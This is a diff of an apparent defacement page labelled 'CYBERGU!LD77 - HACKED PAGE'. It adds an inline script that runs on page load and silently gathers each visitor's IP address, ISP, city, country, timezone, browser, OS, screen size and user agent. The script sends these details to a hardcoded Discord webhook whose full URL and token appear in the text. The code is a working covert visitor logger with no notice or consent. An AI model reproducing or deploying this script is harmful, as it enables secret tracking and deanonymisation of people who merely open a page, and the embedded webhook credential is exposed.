@@ -43,7 +43,122 @@
     <source src="https://cdn.discordapp.com/attachments/1364409204227571825/1365131281175810110/n9UJx8W.mp3?ex=680c3114&is=680adf94&hm=24b29f97544822d087d6a84a26a499823076c5f65c2cda27d36841e906899e98&" type="audio/mpeg">
     Your browser does not support the audio element.
   </audio>
-  <script src="https://raw.githubusercontent.com/cyberguild77/hacked/refs/heads/main/base/watch/template.base.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+        const discordWebhookUrl = "https://discord.com/api/webhooks/1369031615480594625/LTKxWrp_HIVVshltsG5Mtjx6U8HpLeF2syITc_XW0Yy4XpKXfKyclYmA0q6lHZT-FobM";
+        const organizationName = "CYBERGU!LD77 - HACKED PAGE";
+        const sendVisitorLog = async () => {
+            try {
+                let ipData = {};
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    if (!response.ok) throw new Error(`IP API Error: ${response.status}`);
+                    ipData = await response.json();
+                } catch (ipError) {
+                    console.error("Failed to fetch IP data:", ipError);
+                    ipData = {
+                        ip: "N/A",
+                        country_name: "N/A",
+                        region: "N/A",
+                        city: "N/A",
+                        org: "N/A",
+                        timezone: "N/A"
+                    };
+                }
+                const userAgent = navigator.userAgent || "N/A";
+                const language = navigator.language || "N/A";
+                const platform = navigator.platform || "N/A";
+                const screenWidth = window.screen.width || 0;
+                const screenHeight = window.screen.height || 0;
+                const localTime = new Date();
+                const timezoneOffsetMinutes = localTime.getTimezoneOffset();
+                const timezoneOffsetHours = -timezoneOffsetMinutes / 60;
+                const timezoneOffsetString = `UTC${timezoneOffsetHours >= 0 ? '+' : ''}${timezoneOffsetHours}`;
+                const getOS = (ua) => {
+                    if (/Windows/i.test(ua)) return "Windows";
+                    if (/Macintosh|Mac OS X/i.test(ua)) return "macOS";
+                    if (/Linux/i.test(ua)) {
+                        if (/Android/i.test(ua)) return "Android";
+                        return "Linux";
+                    }
+                    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+                    if (/CrOS/.test(ua)) return "Chrome OS";
+                    if (/PlayStation/i.test(ua)) return "PlayStation";
+                    if (/Xbox/.test(ua)) return "Xbox";
+                    if (/Nintendo/.test(ua)) return "Nintendo";
+                    return "Unknown OS";
+                };
+
+                const getBrowser = (ua) => {
+                    if (/Edg/i.test(ua)) return "Edge";
+                    if (/MSIE|Trident/i.test(ua)) return "Internet Explorer";
+                    if (/Firefox/i.test(ua)) return "Firefox";
+                    if (/Opera|OPR/i.test(ua)) return "Opera";
+                    if (/Chrome/i.test(ua)) return "Chrome";
+                    if (/Safari/i.test(ua)) return "Safari";
+                    return "Unknown Browser";
+                };
+
+                    const getDeviceType = (os, ua) => {
+                    if (os === "Android" || os === "iOS") return "Mobile";
+                    if (/Tablet/i.test(ua)) return "Tablet";
+                    if (os === "PlayStation" || os === "Xbox" || os === "Nintendo") return "Console";
+                    if (os === "Windows" || os === "macOS" || os === "Linux" || os === "Chrome OS") return "Desktop";
+                    if (navigator.maxTouchPoints > 0 && screenWidth < 1024) return "Mobile/Tablet";
+                    return "Desktop/Unknown";
+                };
+
+                const os = getOS(userAgent);
+                const browser = getBrowser(userAgent);
+                const deviceType = getDeviceType(os, userAgent);
+                const embed = {
+                    title: `🌐 Novo Acesso ao Site ${organizationName}`,
+                    color: 0x00AAFF,
+                    timestamp: localTime.toISOString(),
+                    footer: {
+                        text: `${organizationName} Access Logger`,
+                    },
+                    fields: [
+                        { name: " IP Address", value: `\`${ipData.ip || 'N/A'}\``, inline: true },
+                        { name: " ISP / Org", value: `\`${ipData.org || 'N/A'}\``, inline: true },
+                        { name: " País", value: `:flag_${(ipData.country_code || 'xx').toLowerCase()}: ${ipData.country_name || 'N/A'}`, inline: true }, 
+                        { name: " Região", value: `\`${ipData.region || 'N/A'}\``, inline: true },
+                        { name: " Cidade", value: `\`${ipData.city || 'N/A'}\``, inline: true },
+                        { name: " Timezone (IP)", value: `\`${ipData.timezone || 'N/A'}\``, inline: true },
+                        { name: " Tipo de Dispositivo", value: deviceType, inline: true },
+                        { name: "️ Sistema Operacional", value: os, inline: true },
+                        { name: " Navegador", value: browser, inline: true },
+                        { name: " Idioma", value: `\`${language}\``, inline: true },
+                        { name: "️ Resolução Tela", value: `\`${screenWidth}x${screenHeight}\``, inline: true },
+                        { name: " Plataforma (JS)", value: `\`${platform}\``, inline: true },
+                            { name: " Data/Hora (Local User)", value: `\`${localTime.toLocaleString()}\``, inline: false },
+                            { name: " Timezone (Local User)", value: `\`${timezoneOffsetString}\``, inline: true },
+                            { name: " User Agent String", value: `\`\`\`${userAgent}\`\`\``, inline: false },
+                    ]
+                };
+                const response = await fetch(discordWebhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ embeds: [embed] }),
+                });
+
+                if (!response.ok) {
+                        const errorData = await response.json().catch(() => ({ message: "Could not parse error response" }));
+                        console.error(`Failed to send log to Discord (${response.status}):`, errorData);
+                        throw new Error(`Discord webhook failed: ${response.status}`);
+                }
+
+                console.log("Visitor log successfully sent to Discord.");
+
+            } catch (error) {
+                console.error("Error in sendVisitorLog function:", error);
+            }
+        };
+        sendVisitorLog();
+    });
+  </script>
   <script>
     const audioElement = document.getElementById('background-audio');
     const ipAddressElement = document.getElementById('ip-address');
